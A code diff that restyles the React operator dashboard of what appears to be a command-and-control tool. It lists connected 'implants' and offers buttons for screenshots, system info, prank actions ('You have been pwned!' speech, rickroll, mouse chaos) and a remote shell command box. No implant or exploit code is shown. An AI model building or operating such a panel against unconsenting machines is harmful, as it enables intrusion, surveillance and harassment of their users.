@@ -1,5 +1,10 @@
 import { useState, useEffect } from 'react'
 import { Monitor, Terminal, Play, Volume2, Camera, Skull, Image, Mouse, Trash2, RefreshCw } from 'lucide-react'
+import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
+import { Input } from '@/components/ui/input'
+import { Badge } from '@/components/ui/badge'
+import { Button } from '@/components/ui/button'
+import { ScrollArea } from '@/components/ui/scroll-area'
 
 interface Implant {
   id: string
@@ -134,7 +139,7 @@ function App() {
   }
 
   return (
-    <div className="flex h-screen bg-zinc-950">
+    <div className="flex h-screen bg-zinc-950 dark">
       {/* Sidebar */}
       <div className="w-72 bg-zinc-900 border-r border-zinc-800 flex flex-col">
         <div className="p-4 border-b border-zinc-800">
@@ -166,32 +171,34 @@ function App() {
         </div>
 
         {/* Device List */}
-        <div className="flex-1 overflow-auto p-2 space-y-1">
-          {filteredImplants.map(imp => (
-            <button
-              key={imp.id}
-              onClick={() => setSelected(imp.id)}
-              className={`w-full text-left p-3 rounded-lg transition ${
-                selected === imp.id
-                  ? 'bg-purple-600 text-white'
-                  : 'bg-zinc-800 text-zinc-300 hover:bg-zinc-700'
-              }`}
-            >
-              <div className="flex items-center justify-between">
-                <span className="font-medium truncate">{imp.hostname}</span>
-                <span className={`w-2 h-2 rounded-full ${
-                  imp.status === 'online' ? 'bg-green-400' :
-                  imp.status === 'idle' ? 'bg-yellow-400' : 'bg-zinc-600'
-                }`} />
-              </div>
-              <div className="text-xs opacity-70 truncate">{imp.username}@{imp.ip}</div>
-              <div className="text-xs opacity-50 flex justify-between mt-1">
-                <span>{imp.os.split(' ')[0]}</span>
-                <span>{imp.last_seen}</span>
-              </div>
-            </button>
-          ))}
-        </div>
+        <ScrollArea className="flex-1 p-2">
+          <div className="space-y-1">
+            {filteredImplants.map(imp => (
+              <button
+                key={imp.id}
+                onClick={() => setSelected(imp.id)}
+                className={`w-full text-left p-3 rounded-lg transition ${
+                  selected === imp.id
+                    ? 'bg-purple-600 text-white'
+                    : 'bg-zinc-800 text-zinc-300 hover:bg-zinc-700'
+                }`}
+              >
+                <div className="flex items-center justify-between">
+                  <span className="font-medium truncate">{imp.hostname}</span>
+                  <span className={`w-2 h-2 rounded-full ${
+                    imp.status === 'online' ? 'bg-green-400' :
+                    imp.status === 'idle' ? 'bg-yellow-400' : 'bg-zinc-600'
+                  }`} />
+                </div>
+                <div className="text-xs opacity-70 truncate">{imp.username}@{imp.ip}</div>
+                <div className="text-xs opacity-50 flex justify-between mt-1">
+                  <span>{imp.os.split(' ')[0]}</span>
+                  <span>{imp.last_seen}</span>
+                </div>
+              </button>
+            ))}
+          </div>
+        </ScrollArea>
       </div>
 
       {/* Main */}
@@ -203,12 +210,15 @@ function App() {
               {selectedImplant ? (
                 <span className="flex items-center gap-2">
                   {selectedImplant.hostname}
-                  <span className={`px-2 py-0.5 text-xs rounded ${
-                    selectedImplant.status === 'online' ? 'bg-green-900 text-green-400' :
-                    selectedImplant.status === 'idle' ? 'bg-yellow-900 text-yellow-400' : 'bg-zinc-700 text-zinc-400'
-                  }`}>
+                  <Badge variant={
+                    selectedImplant.status === 'online' ? 'default' :
+                    selectedImplant.status === 'idle' ? 'secondary' : 'outline'
+                  } className={
+                    selectedImplant.status === 'online' ? 'bg-green-600' :
+                    selectedImplant.status === 'idle' ? 'bg-yellow-600' : ''
+                  }>
                     {selectedImplant.status}
-                  </span>
+                  </Badge>
                 </span>
               ) : 'Select a device'}
             </h2>
@@ -221,98 +231,103 @@ function App() {
         </div>
 
         {/* Content */}
-        <div className="flex-1 p-6 overflow-auto">
+        <ScrollArea className="flex-1 p-6">
           {selected ? (
             <div className="space-y-6">
               {/* Quick Actions */}
               <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-3">
-                <button onClick={() => sendCommand('SysInfo')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
-                  <Monitor className="w-5 h-5 text-blue-400 mx-auto mb-2" />
-                  <div className="text-xs text-zinc-300">Sysinfo</div>
-                </button>
-                <button onClick={() => sendCommand('Screenshot')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
-                  <Camera className="w-5 h-5 text-green-400 mx-auto mb-2" />
-                  <div className="text-xs text-zinc-300">Screenshot</div>
-                </button>
-                <button onClick={() => sendCommand('Rickroll')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
-                  <Play className="w-5 h-5 text-red-400 mx-auto mb-2" />
-                  <div className="text-xs text-zinc-300">Rickroll</div>
-                </button>
-                <button onClick={() => sendCommand('Speak', { message: 'You have been pwned!' })} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
-                  <Volume2 className="w-5 h-5 text-yellow-400 mx-auto mb-2" />
-                  <div className="text-xs text-zinc-300">Speak</div>
-                </button>
-                <button onClick={() => sendCommand('Popup')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
-                  <Image className="w-5 h-5 text-pink-400 mx-auto mb-2" />
-                  <div className="text-xs text-zinc-300">Popup</div>
-                </button>
-                <button onClick={() => sendCommand('Wallpaper')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
-                  <Image className="w-5 h-5 text-purple-400 mx-auto mb-2" />
-                  <div className="text-xs text-zinc-300">Wallpaper</div>
-                </button>
-                <button onClick={() => sendCommand('MouseChaos')} className="p-4 bg-zinc-800 rounded-lg hover:bg-zinc-700 transition">
-                  <Mouse className="w-5 h-5 text-orange-400 mx-auto mb-2" />
-                  <div className="text-xs text-zinc-300">Mouse</div>
-                </button>
-                <button onClick={() => sendCommand('Uninstall')} className="p-4 bg-zinc-800 rounded-lg hover:bg-red-900/50 transition">
-                  <Trash2 className="w-5 h-5 text-red-500 mx-auto mb-2" />
-                  <div className="text-xs text-zinc-300">Uninstall</div>
-                </button>
+                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('SysInfo')}>
+                  <Monitor className="w-5 h-5 text-blue-400 mb-2" />
+                  <span className="text-xs">Sysinfo</span>
+                </Button>
+                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('Screenshot')}>
+                  <Camera className="w-5 h-5 text-green-400 mb-2" />
+                  <span className="text-xs">Screenshot</span>
+                </Button>
+                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('Rickroll')}>
+                  <Play className="w-5 h-5 text-red-400 mb-2" />
+                  <span className="text-xs">Rickroll</span>
+                </Button>
+                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('Speak', { message: 'You have been pwned!' })}>
+                  <Volume2 className="w-5 h-5 text-yellow-400 mb-2" />
+                  <span className="text-xs">Speak</span>
+                </Button>
+                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('Popup')}>
+                  <Image className="w-5 h-5 text-pink-400 mb-2" />
+                  <span className="text-xs">Popup</span>
+                </Button>
+                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('Wallpaper')}>
+                  <Image className="w-5 h-5 text-purple-400 mb-2" />
+                  <span className="text-xs">Wallpaper</span>
+                </Button>
+                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('MouseChaos')}>
+                  <Mouse className="w-5 h-5 text-orange-400 mb-2" />
+                  <span className="text-xs">Mouse</span>
+                </Button>
+                <Button variant="destructive" className="flex-col h-auto py-4" onClick={() => sendCommand('Uninstall')}>
+                  <Trash2 className="w-5 h-5 mb-2" />
+                  <span className="text-xs">Uninstall</span>
+                </Button>
               </div>
 
               {/* Command Input */}
-              <div className="bg-zinc-900 rounded-lg p-4">
-                <div className="flex items-center gap-2 mb-3">
-                  <Terminal className="w-4 h-4 text-zinc-400" />
-                  <span className="text-sm text-zinc-400">Execute Command</span>
-                </div>
-                <div className="flex gap-2">
-                  <input
-                    type="text"
-                    value={command}
-                    onChange={e => setCommand(e.target.value)}
-                    onKeyDown={e => e.key === 'Enter' && execCommand()}
-                    placeholder="whoami"
-                    className="flex-1 bg-zinc-800 border border-zinc-700 rounded px-3 py-2 text-white placeholder-zinc-500 focus:outline-none focus:border-purple-500 font-mono"
-                  />
-                  <button
-                    onClick={execCommand}
-                    disabled={loading || !command.trim()}
-                    className="px-4 py-2 bg-purple-600 text-white rounded hover:bg-purple-500 disabled:opacity-50 transition"
-                  >
-                    Run
-                  </button>
-                </div>
-              </div>
+              <Card className="bg-zinc-900 border-zinc-800">
+                <CardHeader className="pb-2">
+                  <CardTitle className="text-sm flex items-center gap-2">
+                    <Terminal className="w-4 h-4 text-zinc-400" />
+                    Execute Command
+                  </CardTitle>
+                </CardHeader>
+                <CardContent>
+                  <div className="flex gap-2">
+                    <Input
+                      value={command}
+                      onChange={(e: React.ChangeEvent<HTMLInputElement>) => setCommand(e.target.value)}
+                      onKeyDown={(e: React.KeyboardEvent) => e.key === 'Enter' && execCommand()}
+                      placeholder="whoami"
+                      className="flex-1 bg-zinc-800 border-zinc-700 font-mono"
+                    />
+                    <Button onClick={execCommand} disabled={loading || !command.trim()} className="bg-purple-600 hover:bg-purple-500">
+                      Run
+                    </Button>
+                  </div>
+                </CardContent>
+              </Card>
 
               {/* Results */}
-              <div className="bg-zinc-900 rounded-lg p-4">
-                <div className="flex items-center justify-between mb-3">
-                  <div className="flex items-center gap-2">
-                    <Terminal className="w-4 h-4 text-zinc-400" />
-                    <span className="text-sm text-zinc-400">Output</span>
+              <Card className="bg-zinc-900 border-zinc-800">
+                <CardHeader className="pb-2">
+                  <div className="flex items-center justify-between">
+                    <CardTitle className="text-sm flex items-center gap-2">
+                      <Terminal className="w-4 h-4 text-zinc-400" />
+                      Output
+                    </CardTitle>
+                    <Button variant="ghost" size="sm" onClick={() => setResults([])}>
+                      <RefreshCw className="w-3 h-3" />
+                    </Button>
                   </div>
-                  <button onClick={() => setResults([])} className="text-xs text-zinc-500 hover:text-zinc-300">
-                    <RefreshCw className="w-3 h-3" />
-                  </button>
-                </div>
-                <div className="bg-zinc-950 rounded p-3 font-mono text-sm text-zinc-300 max-h-96 overflow-auto">
-                  {results.length === 0 ? (
-                    <span className="text-zinc-500">No output yet</span>
-                  ) : (
-                    results.map((r, i) => (
-                      <div key={i} className="mb-3 pb-3 border-b border-zinc-800 last:border-0">
-                        <div className="flex items-center gap-2 text-xs text-zinc-500 mb-1">
-                          <span className={r.success ? 'text-green-500' : 'text-red-500'}>{r.success ? 'OK' : 'ERR'}</span>
-                          <span>{r.type}</span>
-                          <span>{r.timestamp}</span>
-                        </div>
-                        <pre className="whitespace-pre-wrap text-zinc-300">{r.output}</pre>
-                      </div>
-                    ))
-                  )}
-                </div>
-              </div>
+                </CardHeader>
+                <CardContent>
+                  <ScrollArea className="h-96">
+                    <div className="bg-zinc-950 rounded p-3 font-mono text-sm text-zinc-300">
+                      {results.length === 0 ? (
+                        <span className="text-zinc-500">No output yet</span>
+                      ) : (
+                        results.map((r, i) => (
+                          <div key={i} className="mb-3 pb-3 border-b border-zinc-800 last:border-0">
+                            <div className="flex items-center gap-2 text-xs text-zinc-500 mb-1">
+                              <span className={r.success ? 'text-green-500' : 'text-red-500'}>{r.success ? 'OK' : 'ERR'}</span>
+                              <span>{r.type}</span>
+                              <span>{r.timestamp}</span>
+                            </div>
+                            <pre className="whitespace-pre-wrap text-zinc-300">{r.output}</pre>
+                          </div>
+                        ))
+                      )}
+                    </div>
+                  </ScrollArea>
+                </CardContent>
+              </Card>
             </div>
           ) : (
             <div className="flex flex-col items-center justify-center h-full text-zinc-500">
@@ -321,7 +336,7 @@ function App() {
               <p className="text-sm mt-2">{implants.length} implants connected</p>
             </div>
           )}
-        </div>
+        </ScrollArea>
       </div>
     </div>
   )
